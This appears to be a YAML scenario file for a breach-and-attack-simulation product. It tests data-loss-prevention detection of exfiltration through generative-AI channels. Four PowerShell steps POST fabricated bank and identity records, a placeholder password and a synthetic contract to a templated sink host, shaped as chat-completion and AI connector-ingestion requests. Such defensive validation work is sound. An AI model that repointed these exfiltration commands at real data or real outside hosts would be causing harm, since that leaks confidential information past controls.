id: dlp-exfiltration-ai-prompt
product_line: dlp
name: DLP Exfiltration Validation — Generative-AI Channels
description: >
  Attempts to exfiltrate synthetic sensitive records through two
  generative-AI integration shapes: a public AI chat-completion API
  (OpenAI-compatible POST /v1/chat/completions, sensitive content embedded
  in a user prompt) and an enterprise AI connector/retrieval-ingestion API
  (Microsoft Graph connector content-ingestion shape, sensitive content
  embedded in an uploaded item's content).

  Closes the DLP-AI gap named in dlp.txt §1.07 and §3B -- the only one of
  10 named exfiltration-channel scenario families with zero prior code.
  Verdict comes from whether the platform's own AI-shaped routes
  (internal/aisink) ever receive a request whose embedded token matches
  this run -- ground truth resolved server-side, never from anything the
  step's own script can locally confirm.

  Fidelity: each step reproduces its shape's real request/response
  structure (chat-completion message array, connector-ingestion content
  field) but does not use a real OpenAI, Anthropic, Microsoft Copilot or
  Google account. This is a traffic-shape simulation only.

  Scope boundary (named explicitly, not hidden behind a green checkmark):
  this scenario does not simulate multi-turn conversation state,
  connector-mediated retrieval (an AI tool pulling sensitive data FROM a
  source, rather than a user submitting it TO the AI service), or
  prompt-injection/jailbreak content -- those remain untested gaps. MITRE
  mapping is the parent technique T1567 (Exfiltration Over Web Service),
  not a sub-technique: none of T1567.002 (cloud storage), .004 (webhook)
  accurately describes a chat-completion or connector-ingestion API.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The sink stores only a hash of the received payload, never the
  raw content. Every destination is this same on-prem orchestrator's own
  main API server -- no external AI vendor is ever contacted. Windows
  only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - ai
  - genai
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:

  # ---------------------------------------------------------------------------
  # Shape 1 — Public AI chat-completion API traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — AI Chat-Completion Exfiltration of Multi-Type Sensitive Record (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own AI chat-completion-shaped endpoint (this same on-prem orchestrator). No real AI vendor account, no real API key, no external destination -- traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: AI chat-completion-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $content = "$token`n$csvContent"
      $body = @{
        model    = "bas-sim-model"
        messages = @(@{ role = "user"; content = $content })
      } | ConvertTo-Json -Compress -Depth 5
      $uri = "https://{{SINK_AI_HOST}}:{{SINK_AI_PORT}}/aisink/v1/chat/completions"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -Headers @{ Authorization = "Bearer bas-sim-irrelevant-key" } -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: ai_chat_completion_result=success"
        Write-Output "EXEC T1567: AI chat-completion traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CHAT]"
      } catch {
        Write-Output "DLP_OBSERVATION: ai_chat_completion_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567: AI chat-completion traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CHAT]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the AI sink actually
      # received a request with a matching token, resolved server-side by
      # internal/aisink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own
      # success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Shape 1 — Public AI chat-completion API, Go source code
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — AI Chat-Completion Exfiltration of Go Source Code (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Go-source-code-shaped prompt (embedded fake secret) to the platform's own AI chat-completion-shaped endpoint (this same on-prem orchestrator). No real AI vendor account, no external destination -- traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: AI chat-completion-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "// [BAS-SIM-DLP]`nconst dbPassword = `"BAS-SIM-DLP-Placeholder8`" // test fixture`n// Can you review this code for bugs?"
      $token = "{{SINK_TOKEN}}"
      $content = "$token`n$payload"
      $body = @{
        model    = "bas-sim-model"
        messages = @(@{ role = "user"; content = $content })
      } | ConvertTo-Json -Compress -Depth 5
      $uri = "https://{{SINK_AI_HOST}}:{{SINK_AI_PORT}}/aisink/v1/chat/completions"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -Headers @{ Authorization = "Bearer bas-sim-irrelevant-key" } -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: ai_chat_completion_result=success"
        Write-Output "EXEC T1567: Go-source-code-shaped AI chat-completion traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CHAT]"
      } catch {
        Write-Output "DLP_OBSERVATION: ai_chat_completion_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567: AI chat-completion traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CHAT]"
      }
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Shape 2 — Enterprise AI connector/retrieval-ingestion API traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — AI Connector-Ingestion Exfiltration of Multi-Type Sensitive Record (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own AI connector-ingestion-shaped endpoint (this same on-prem orchestrator). No real AI vendor account, no real Graph connector, no external destination -- traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: AI connector-ingestion-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $contentValue = "$token`n$csvContent"
      $body = @{
        id      = "bas-sim-item"
        content = @{ value = $contentValue; type = "text" }
      } | ConvertTo-Json -Compress -Depth 5
      $uri = "https://{{SINK_AI_HOST}}:{{SINK_AI_PORT}}/aisink/v1.0/external/connections/bas-sim-connection/items/bas-sim-item"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -Headers @{ Authorization = "Bearer bas-sim-irrelevant-key" } -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: ai_connector_ingestion_result=success"
        Write-Output "EXEC T1567: AI connector-ingestion traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CONNECTOR]"
      } catch {
        Write-Output "DLP_OBSERVATION: ai_connector_ingestion_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567: AI connector-ingestion traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CONNECTOR]"
      }
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Shape 2 — Enterprise AI connector/retrieval-ingestion API, Employment Contract
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — AI Connector-Ingestion Exfiltration of Employment Contract (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic employment-contract-shaped record to the platform's own AI connector-ingestion-shaped endpoint (this same on-prem orchestrator). No real AI vendor account, no real Graph connector, no external destination -- traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: AI connector-ingestion-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] Employment Contract (Synthetic)`nEmployee: BAS-SIM-Employee`nSalary: `$0.00 (synthetic, test fixture only)"
      $token = "{{SINK_TOKEN}}"
      $contentValue = "$token`n$payload"
      $body = @{
        id      = "bas-sim-item-2"
        content = @{ value = $contentValue; type = "text" }
      } | ConvertTo-Json -Compress -Depth 5
      $uri = "https://{{SINK_AI_HOST}}:{{SINK_AI_PORT}}/aisink/v1.0/external/connections/bas-sim-connection/items/bas-sim-item-2"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -Headers @{ Authorization = "Bearer bas-sim-irrelevant-key" } -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: ai_connector_ingestion_result=success"
        Write-Output "EXEC T1567: Employment-contract-shaped AI connector-ingestion traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CONNECTOR]"
      } catch {
        Write-Output "DLP_OBSERVATION: ai_connector_ingestion_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567: AI connector-ingestion traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-AI-CONNECTOR]"
      }
    cleanup: ""
